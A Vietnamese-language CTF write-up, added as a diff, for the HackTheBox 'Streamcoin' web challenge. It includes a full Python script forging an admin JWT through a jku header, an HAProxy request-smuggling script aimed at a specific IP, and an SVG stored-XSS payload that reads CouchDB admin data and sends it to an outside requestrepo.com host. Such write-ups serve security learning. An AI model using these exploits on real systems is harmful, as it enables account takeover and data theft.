@@ -1,0 +1,198 @@
+---
+title: Streamcoin
+description: 'Created: July 14, 2024 1:28 PM'
+date: 2026-01-03
+tags:
+  - writeup
+category: web
+draft: false
+ctf_event: HTB
+---
+
+import Callout from '@/components/mdx/Callout.astro';
+
+Created: July 14, 2024 1:28 PM
+
+<Callout type="note" title="Note">
+💡 JWT bypass jku
+XSS store in svg file
+HTTP request smuggling in haproxy 2.4.0
+
+</Callout>
+
+- Code có thể sdung gen ra jwt
+
+```python
+import sys, requests, json, random, jwt, base64
+from Crypto.PublicKey import RSA
+
+hostURL = "http://127.0.0.1:1337"               # Challenge host URL
+userName = "user%d" % random.randint(1111,9999) # new username
+userPwd = "pass%d" % random.randint(1111,9999)  # new password
+
+def int_to_bytes(x: int) -> bytes:
+   return x.to_bytes((x.bit_length() + 7) // 8, 'big')
+
+keyPair = RSA.generate(2048)
+pubKey = keyPair.publickey().exportKey('PEM').decode()
+privKey = keyPair.exportKey('PEM').decode()
+keyE = base64.b64encode(int_to_bytes(keyPair.e)).decode()
+keyN = base64.b64encode(int_to_bytes(keyPair.n)).decode()
+jkuData = {
+   "keys": [{
+       "alg": "RS256",
+       "kty": "RSA",
+       "use": "sig",
+       "e": "%s" % keyE,
+       "n": "%s" % keyN,
+       "kid": "pwn3d"
+   }]
+}
+
+def register():
+   jData = { "username": userName, "password": userPwd }
+   req_stat = requests.post("%s/api/register" % hostURL,json=jData).status_code
+   if not req_stat == 200:
+       print("Something went wrong! Is the challenge host live?")
+       sys.exit()
+
+def login():
+   jData = { "username": userName, "password": userPwd }
+   authCookie = requests.post("%s/api/login" % hostURL, json=jData).cookies.get('session')
+   if not authCookie:
+       print("Something went wrong while logging in!")
+       sys.exit()
+   return authCookie
+
+def get_resp(cookie):
+   cookies = {"session": cookie}
+   resp = requests.get("%s/dashboard" % hostURL, cookies=cookies)
+   return resp.text
+
+def jwt_decode(encoded):
+   header = jwt.get_unverified_header(encoded);
+   payload = jwt.decode(encoded, options={"verify_signature": False})
+   return (header,payload)
+
+def jwt_encode(secret, header, payload):
+   return jwt.encode(payload, secret, algorithm="RS256", headers=header).decode('utf-8')
+
+def upload_doc(cookie):
+   cookies = {"session": cookie}
+   files = {'verificationDoc' : ('passport1.pdf', json.dumps(jkuData))}
+   resp = requests.post("%s/api/upload" % hostURL, cookies=cookies, files=files)
+   filename = resp.json().get('filename')
+   if not filename:
+       print('Something went wrong uploading the doc file!')
+       sys.exit()
+   return filename
+
+print("[+] Signing up a new account..")
+register()
+print("[~] Logging in, extracting JWT auth cookie..")
+cookie = login()
+header, payload = jwt_decode(cookie)
+print("[+] Uploading our JWKS contents as a pdf file..")
+pubkeyFile = upload_doc(cookie)
+print("[~] JWKS contents uploaded at : /uploads/%s" % pubkeyFile)
+print("[+] Overwriting the JKU endpoint with our uploaded file link")
+header = {"jku":"http://localhost:1337/uploads/%s" % pubkeyFile, "kid":"pwn3d"}
+print("[+] changing username to 'admin', signing JWT with our private key")
+payload['username'] = 'admin'
+encCookie = jwt_encode(privKey, header, payload)
+print("[+] Requesting dashboard for admin with forged cookie")
+getDashboard = get_resp(encCookie)
+if 'Logout' not in getDashboard:
+   print('[!] Failed to access admin panel with forged cookie!')
+   sys.exit()
+print('[+] Congrats the exploit worked!')
+print('[~] Forged cookie : %s' % encCookie)
+```
+
+- XSS store in svg file
+  - Viết check cơ bản thử alert, fetch()
+
+  ```python
+  <?xml version="1.0" standalone="no"?>
+  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+  <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+    <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+    <script type="text/javascript">
+     alert();
+    </script>
+  </svg>
+  ```
+
+- Giờ ý tưởng dùng request smuggle vào api/test-ui với quyền admin và ip: 127.0.0.1 từ đó thực hiện xss, fetch api đến couchdb port 5984 như RESTAPI để truy vấn lấy flag
+- Final payload
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+# Connect to the challenge server
+IP, PORT = '94.237.53.113', 42627
+conn = remote(IP, PORT)
+
+# First request, overflow content-length header.
+# Second content-length header is the size of the first part of the second request.
+# i.e. len('POST /api/test-ui HTTP/1.1\r\nh:')
+request = '''POST / HTTP/1.1\r
+Host: 94.237.53.113:42627\r
+Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r
+Content-Length: 31\r
+\r
+POST /api/test-ui HTTP/1.1\r
+h:'''
+
+# Second request contains all important header for /api/test-ui request
+# Like the JWT token that we created and signed earlier.
+payload = '{"path":"uploads/1a6620a518c08ff31db6ff0c885a5c38.svg","keyword":"t"}'
+secreq = '''POST /api/register HTTP/1.1\r
+Host: 127.0.0.1:1337\r
+Cookie: session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImY0NjVmZDEzLTc5ODYtNDE2OS1iM2NiLTM1MTM1OGU1YWJiZCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MTMzNy91cGxvYWRzLzJhNTkxMTcxNzIyN2FlOGFhYTZiMTUxM2I4N2U1Mzg4LnBkZiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIwOTcwOTQ0fQ.oP_1SF2JlCvIeVu-k-BxeKaH0dm0b2WuWK4REqNhhrgQUmPr3ydj6ZL2VVju5c5Suhyen1LZDgp5HrPoYVduuxzQS-nHGcIG16Q5oh7ieoNfN_Fet3s3AffJuDzdBoJ-YCtOg05FCAAdGrw8ZsVWtDodTSvLIADY7MUxM-VYnBeW6qCGBCea1tCVVigsv2NfIrzeu8t6k0sBVVWAq2MSM7XO5yy0TdRq3YvsygwU2eDTW8EBjqyAh5-JoIsdHovG0zcRGFET6EBryHgxJ0ZJTmZlqL6HmiUna9BQEpKOzlv1qw5C4Sx9--S939bPORbV9ABv0l77Cln1AvIqZqRXYg\r
+Content-type: application/json\r
+Content-length: {0}\r
+\r
+{1}\r
+\r
+'''.format(len(payload), payload)
+
+conn.send(request)
+print(conn.recvuntil('"}'))
+
+conn.send(secreq)
+conn.interactive()
+```
+
+- file svg upload
+
+```python
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+  <script type="text/javascript">
+    headers = {
+    'Authorization': 'Basic ' + btoa('admin' + ":" +'youwouldntdownloadacouch')
+    }
+    fetch('http://127.0.0.1:5984/users/admin', {headers: headers})
+    .then(response => response.json())
+    .then(data => {
+    fetch('http://ww448ecq.requestrepo.com?c='+data.verification_doc)
+    })
+  </script>
+</svg>
+```
+
+- Thành công lấy flag
+
+![Untitled](/uploads/streamcoin/Streamcoin/Untitled.png)
+
+# Reference
+
+[https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/steamcoin/](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/steamcoin/)
+
+[https://www.hackthebox.com/blog/UNI-CTF-2021-Steam-Coin](https://www.hackthebox.com/blog/UNI-CTF-2021-Steam-Coin)
